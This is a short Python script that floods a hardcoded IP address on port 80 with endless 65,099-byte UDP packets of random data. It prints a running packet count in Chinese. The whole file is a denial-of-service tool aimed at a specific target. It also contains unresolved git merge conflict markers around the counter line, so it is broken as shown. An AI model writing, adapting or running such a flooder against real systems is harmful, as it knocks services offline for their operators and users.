import os
import socket
import random
from datetime import datetime
 
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
bytes = random._urandom(65099)
 
ip = "8.211.170.143"
port = 80
 
os.system("clear")
 
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
<<<<<<< HEAD
    sent = sent + 1
=======
    sent = sent + 100000
>>>>>>> 重新初始化仓库，排除虚拟环境
    print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))